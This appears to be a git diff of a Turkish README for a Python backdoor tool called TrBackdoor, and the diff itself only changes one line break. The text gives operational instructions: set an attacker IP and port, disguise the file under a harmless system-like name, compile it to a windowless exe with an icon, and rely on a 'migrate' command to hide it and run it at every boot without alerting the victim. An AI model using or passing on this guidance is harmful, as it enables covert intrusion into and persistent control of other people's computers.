@@ -3,7 +3,7 @@
 ![ConverotrExe](https://github.com/OgulcanKacarr/TrBackdoor/blob/master/ConfigImages/Command.png)
 ## Backdoor Ayarları
 Not: sysupgrades ismini isterseniz değiştirebilirsiniz. Lakin backdoor'u hedefte saklamak istediğiniz zaman değiştirmiş olacağınız isim kullanıcıyı şüphelendirmemeli.<br/>
-Öncelikle "sysupgrades.py" dosyamızı herhangi bir editör ile açınız ('SublimeText3').<br/>Daha sonra sınıfın dışında yer alan"ConfigSocket = MySocket("<İP>"<PORT>) kısmına backdoor için bir ip adresi ve port numarası giriniz. Yani
+Öncelikle "sysupgrades.py" dosyamızı herhangi bir editör ile açınız ('SublimeText3').<br/>Daha sonra sınıfın dışında yer alan"ConfigSocket = MySocket("<İP>"<PORT>) kısmına backdoor için bir ip adresi ve port numarası giriniz. Yani<br/>
 <br/>![ConverotrExe](https://github.com/OgulcanKacarr/TrBackdoor/blob/master/ConfigImages/BackdoorConfig.png)
 ## Exe'ye Çevirme
 "sysupgrades.py" backdoor'umuzu hedefimize göndermeden önce "pyinstaller" kullanarak exe'ye çevirelim.<br/> Burada size önerdiğim exe'ye çevirme işleminde mutlaka bir icon ekleyiniz ve noconsole komutunu kullanınız. Fakat dosyayı bir başka dosya ile (pdf) birleştirmeyiniz. Çünkü bağlantı sağladıktan sonra "migrate" komutunu kullandığınız sırada backdoor saklanacaktır. Kullanıcı bilgisayarını her başlattığında başlayacaktır. İşte bu başlatma sırasında her defasında backdoor ile birlikte pdf açılmasın ki kullanıcı şüphelenmesin diye exe'ye çevirirken bir dosya ile birleştirilmesini önermiyorum.<br/>
